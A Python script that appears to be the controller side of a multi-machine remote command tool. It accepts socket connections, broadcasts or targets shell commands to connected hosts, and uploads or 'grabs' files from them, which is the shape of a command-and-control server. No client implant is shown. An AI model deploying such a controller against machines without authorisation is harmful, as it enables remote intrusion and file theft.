#!/usr/bin/env python3
import socket 
import threading
import tqdm
import os

#############################
## ========  Config  ========
PORT = 5050             ## CONFIGURE THIS (TODO)
SERVER = '127.0.0.1'    ## CONFIGURE THIS (TODO)
## --------------------------
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
HEADER = 64
SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step
#############################

## ======== Utils     ========
def snd_msg(conn, msg):
    message = msg.encode(FORMAT)
    length = (str(len(message))).encode(FORMAT)
    length += b' ' * (HEADER - len(length))
    conn.send(length)
    conn.send(message)

def get_msg(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        bytes_recevied = 0
        msg = ""
        while bytes_recevied < msg_length:
            buff = conn.recv(msg_length).decode(FORMAT)
            bytes_recevied = bytes_recevied + len(buff)
            msg = msg + buff
        return msg
    else:
        return ""

def snd_file(conn, filename):
    try:
        filesize = os.path.getsize(filename)
    except:
        return f"{filename} does not exist."

    snd_msg(conn, f"{filename}{SEPARATOR}{filesize}")
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    bytes_left = filesize

    with open(filename, 'rb') as f:
        while bytes_left > 0:
            # read the bytes from the file
            if bytes_left > BUFFER_SIZE:
                bytes_to_read = BUFFER_SIZE
            else:
                bytes_to_read = bytes_left
            bytes_read = f.read(bytes_to_read)
            bytes_left = bytes_left - bytes_to_read
            # we use sendall to assure transimission in
            # busy networks
            conn.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    progress.close()
    f.close()
    return "SUCCESS"

def get_file(conn):
    # receive the file infos
    # receive using client socket, not server socket
    received = get_msg(conn)
    filename, filesize = received.split(SEPARATOR)
 
    # convert to integer
    filesize = int(filesize)
 
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}.", unit="B", unit_scale=True, unit_divisor=1024)
    bytes_left = filesize
    with open(filename, "wb") as f:
        while bytes_left > 0:
            if bytes_left < BUFFER_SIZE:
                bytes_to_write = bytes_left
            else:
                bytes_to_write = BUFFER_SIZE
            # read 1024 bytes from the socket (receive)
            bytes_read = conn.recv(bytes_to_write)
            #print(bytes_read)
            bytes_left = bytes_left - bytes_to_write
            #print(f'Bytes left {str(bytes_left)}')
            # write to the file the bytes we just received
            f.write(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    progress.close()
    f.close()
    return "SUCCESS"

## ========  Globals  ========
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)
connected_machines = []
            
# Processes the user input
def handle_user():

    while True:
        cmd = input("> ") 
        cmd_lst = cmd.split()
        if len(cmd_lst) <= 0:
            continue

        ## Broadcast
        elif cmd_lst[0] == "broadcast":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: broadcast <cmd>")
                continue
            new_cmd = ' '.join(new_cmd).lstrip(' ')
            print(f'Sending \"{new_cmd}\" to...')
            itr = 1
            for data in connected_machines:
                print(f"{str(itr)}) {data['addr'][0]}")
                snd_msg(data['conn'], new_cmd)
                resp = get_msg(data['conn'])
                print(resp)
                print("=============================================")
                itr = itr + 1

        ## List
        elif cmd_lst[0] == "list":
            count = 1
            for data in connected_machines:
                print(f'{str(count)}) {data["addr"][0]}')
                count = count + 1

        ## Send
        elif cmd_lst[0] == "send":
            new_cmd = cmd_lst[1:]
            if len(new_cmd) < 1:
                print("Usage: send <ip> <cmd>")
                continue
            sent = False
            for data in connected_machines:
                if data['addr'][0] == new_cmd[0]:
                    sent = True
                    msg = (' '.join(new_cmd[1:])).lstrip(' ')
                    snd_msg(data['conn'], msg)
                    resp = get_msg(data['conn'])
                    print(resp)

            if not sent:
                print(f'{new_cmd[0]} is not connected to the server.')
    
        ## grab
        elif cmd_lst[0] == "grab":
            if len(cmd_lst) != 3:
                print("Usage: grab <filename> <ip>")
                continue
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[2]:
                    snd_msg(data['conn'], "grab")             
                    snd_msg(data['conn'], cmd_lst[1]) ## Sending ip the file name to grab
                    resp = get_msg(data['conn'])

                    if resp != "SUCCESS":
                        print(resp)
                        continue
                   
                    resp = get_file(data['conn']) 
                    if resp != "SUCCESS":
                        print(resp)
                        continue

        ## put
        elif cmd_lst[0] == "put":
            if len(cmd_lst) != 3:
                print("Usage: put <filename> <ip>")
                continue

            for data in connected_machines:
                if data['addr'][0] == cmd_lst[2]:
                    snd_msg(data['conn'], "put")
                    resp = snd_file(data['conn'], cmd_lst[1])
                    if resp != "SUCCESS":
                        print(resp)
                        continue

        ## Close
        elif cmd_lst[0] == "close":
            for data in connected_machines:
                if data['addr'][0] == cmd_lst[1]:
                    snd_msg(data['conn'], "close")
                    data['conn'].close()
                    connected_machines.remove(data)

        ## help
        elif cmd_lst[0] == "help":
            print("1. broadcast <cmd here>")
            print("2. list")
            print("3. send <ip> <cmd here>")
            print("4. put <filename> <ip>")
            print("5. grab <filename> <ip>")
            print("6. close <ip>")
            print("7. help")

        ## Cmd not recognized
        else:
            print("Sorry, did not recognize that command.")
    

def start():
    server.listen()
    print(f"Server is listening on {SERVER}")
    t = threading.Thread(target=handle_user, args=())
    t.start()
    while True:
        conn, addr = server.accept()
        data = {
            'conn': conn,
            'addr': addr,
        }
        connected_machines.append(data)


start()
